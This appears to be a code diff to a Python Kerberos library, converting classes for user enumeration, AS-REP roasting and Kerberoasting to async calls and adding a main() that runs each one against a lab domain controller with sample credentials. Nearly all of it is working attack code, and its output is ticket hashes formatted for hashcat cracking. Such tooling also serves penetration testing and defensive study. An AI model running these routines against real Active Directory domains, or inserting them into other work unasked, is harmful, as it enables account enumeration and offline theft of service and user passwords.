@@ -4,26 +4,42 @@
 #  Tamas Jos (@skelsec)
 #
 
-from minikerberos.communication import *
-from minikerberos.utils import TGSTicket2hashcat, TGTTicket2hashcat
+import datetime
+import secrets
+
 from minikerberos import logger
+from minikerberos.aioclient import AIOKerberosClient
+from minikerberos.common.spn import KerberosSPN
+from minikerberos.common.target import KerberosTarget
+from minikerberos.common.creds import KerberosCredential
+from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
+from minikerberos import logger
+from minikerberos.protocol.asn1_structs import PrincipalName, KDCOptions, \
+	PADATA_TYPE, PA_PAC_REQUEST, krb5_pvno, KDC_REQ_BODY, AS_REQ
+
+from minikerberos.protocol.errors import KerberosErrorCode
+from minikerberos.protocol.constants import NAME_TYPE, MESSAGE_TYPE
+from minikerberos.network.selector import KerberosClientSocketSelector
+
 
 class KerberosEtypeTest:
 	# TODO: implement this
 	pass
 
 class KerberosUserEnum:
-	def __init__(self, ksoc):
-		self.ksoc = ksoc
+	def __init__(self, target: KerberosTarget, spn: KerberosSPN):
+		self.target = target
+		self.spn = spn
+		self.ksoc = KerberosClientSocketSelector.select(target, True)
 
-	@staticmethod
-	def construct_tgt_req(realm, username):
+
+	def construct_tgt_req(self):
 		now = now = datetime.datetime.now(datetime.timezone.utc)
 		kdc_req_body = {}
 		kdc_req_body['kdc-options'] = KDCOptions(set(['forwardable','renewable','proxiable']))
-		kdc_req_body['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [username]})
-		kdc_req_body['realm'] = realm.upper()
-		kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', realm.upper()]})
+		kdc_req_body['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [self.spn.username]})
+		kdc_req_body['realm'] = self.spn.domain.upper()
+		kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', self.spn.domain.upper()]})
 		kdc_req_body['till']  = (now + datetime.timedelta(days=1)).replace(microsecond=0)
 		kdc_req_body['rtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
 		kdc_req_body['nonce'] = secrets.randbits(31)
@@ -41,93 +57,109 @@ class KerberosUserEnum:
 		
 		return AS_REQ(kdc_req)
 
-	def run(self, realm, users):
-		"""
-		Requests a TGT in the name of the users specified in users. 
-		Returns a list of usernames that are in the domain.
+	async def run(self):
+		req = self.construct_tgt_req()
 
-		realm: kerberos realm (domain name of the corp)
-		users: list : list of usernames to test
-		"""
-		existing_users = []
-		for user in users:
-			logging.debug('Probing user %s' % user)
-			req = KerberosUserEnum.construct_tgt_req(realm, user)
-			rep = self.ksoc.sendrecv(req.dump(), throw = False)
-			
-			if rep.name != 'KRB_ERROR':	
-				# user doesnt need preauth, but it exists
-				existing_users.append(user)
-			
-			elif rep.native['error-code'] != KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED.value:
-				# any other error means user doesnt exist
-				continue
-			
-			else:
-				# preauth needed, only if user exists
-				existing_users.append(user)
+		rep = await self.ksoc.sendrecv(req.dump(), throw = False)
 
-		return existing_users
+		if rep.name != 'KRB_ERROR':	
+			# user doesnt need preauth, but it exists
+			return True
+			
+		elif rep.native['error-code'] != KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED.value:
+			# any other error means user doesnt exist
+			return False
+			
+		else:
+			# preauth needed, only if user exists
+			return True
 
 class APREPRoast:
-	def __init__(self, ksoc):
-		self.ksoc = ksoc
+	def __init__(self, target: KerberosTarget):
+		self.target = target
 
-	def run(self, creds, override_etype = [23]):
+	async def run(self, cred: KerberosCredential, override_etype = [23]):
 		"""
-		Requests TGT tickets for all users specified in the targets list
-		creds: list : the users to request the TGT tickets for
 		override_etype: list : list of supported encryption types
-		"""			
-		tgts = []
-		for cred in creds:
-			try:
-				kcomm = KerbrosComm(cred, self.ksoc)
-				kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
-				tgts.append(kcomm.kerberos_TGT)
-			except Exception as e:
-				logger.debug('Error while roasting client %s/%s Reason: %s' % (cred.domain, cred.username, str(e)))
-				continue
+		"""
+		try:
+			kcomm = AIOKerberosClient(cred, self.target)
+			await kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
+			return TGTTicket2hashcat(kcomm.kerberos_TGT)
+		except Exception as e:
+			logger.debug('Error while roasting client %s/%s Reason: %s' % (cred.domain, cred.username, str(e)))
 
-		results = []
-		for tgt in tgts:
-			results.append(TGTTicket2hashcat(tgt))
-
-
-		return results
 
 class Kerberoast:
-	def __init__(self, ccred, ksoc, kcomm = None):
-		self.ccred = ccred
-		self.ksoc = ksoc
-		self.kcomm = kcomm
+	def __init__(self, target: KerberosTarget, cred: KerberosCredential):
+		self.target = target
+		self.cred = cred
 
-	def run(self, targets, override_etype = [2, 3, 16, 23, 17, 18]):
-		"""
-		Requests TGS tickets for all service users specified in the targets list
-		targets: list : the SPN users to request the TGS tickets for
-		allhash: bool : Return all enctype tickets, ot just 23
-		"""
-		if not self.kcomm:
-			try:
-				self.kcomm = KerbrosComm(self.ccred, self.ksoc)
-				self.kcomm.get_TGT()
-			except Exception as e:
-				logger.exception('Failed to get TGT ticket! Reason: %s' % str(e))
-				
-		
-		tgss = []
-		for target in targets:
-			try:
-				tgs, encTGSRepPart, key = self.kcomm.get_TGS(target, override_etype = override_etype)
-				tgss.append(tgs)
-			except Exception as e:
-				logger.debug('Failed to get TGS ticket for user %s/%s/%s! Reason: %s' % (target.domain, str(target.service), target.username, str(e)))
-				continue
+	async def run(self, spns, override_etype = [2, 3, 16, 23, 17, 18]):
+		try:
+			kcomm = AIOKerberosClient(self.cred, self.target)
+			await kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
+		except Exception as e:
+			logger.exception('a')
+			logger.debug('Error logging in! Reason: %s' % (str(e)))
 
 		results = []
-		for tgs in tgss:
-			results.append(TGSTicket2hashcat(tgs))
-
+		for spn in spns:
+			try:
+				tgs, _, _ = await kcomm.get_TGS(spn, override_etype = override_etype)
+				results.append(TGSTicket2hashcat(tgs))
+			except Exception as e:
+				logger.exception('b')
+				logger.debug('Failed to get TGS ticket for user %s/%s/%s! Reason: %s' % (spn.domain, str(spn.service), spn.username, str(e)))
+				continue
 
 		return results
+
+async def main():
+	url = 'kerberos+pw://teas\\test:pass@10.10.10.2'
+	ku = KerberosClientURL.from_url(url)
+	target_user = 'asdadfadsf@TEST.corp'
+	target = ku.get_target()
+	print(target)
+	spn = KerberosSPN.from_user_email(target_user)
+	ue = KerberosUserEnum(target, spn)
+	res = await ue.run()
+	print(res)
+	
+	url = 'kerberos+pw://TEST\\asreptest:pass@10.10.10.2'
+	ku = KerberosClientURL.from_url(url)
+	target = ku.get_target()
+	cred = ku.get_creds()
+	arr = APREPRoast(target)
+	res = await arr.run(cred)
+	print(res)
+
+
+	target_user = 'srv_http@TEST.corp'
+	spn = KerberosSPN.from_user_email(target_user)
+	url = 'kerberos+pw://TEST\\victim:Passw0rd!1@10.10.10.2/?timeout=77'
+	ku = KerberosClientURL.from_url(url)
+	target = ku.get_target()
+	cred = ku.get_creds()
+	arr = Kerberoast(target, cred)
+	res = await arr.run([spn])
+	print(res)
+
+	target_user = 'srv_http@TEST.corp'
+	spn = KerberosSPN.from_user_email(target_user)
+	url = 'kerberos+pw://TEST\\victim:Passw0rd!1@10.10.10.2/?proxyhost=10.10.10.102&proxytype=socks5&proxyport=1080'
+	ku = KerberosClientURL.from_url(url)
+	target = ku.get_target()
+	print(target)
+	cred = ku.get_creds()
+	arr = Kerberoast(target, cred)
+	res = await arr.run([spn])
+	print(res)
+
+if __name__ == '__main__':
+	from asysocks import logger as alogger
+	from minikerberos.common.url import KerberosClientURL
+	import asyncio
+	alogger.setLevel(2)
+	asyncio.run(main())
+	
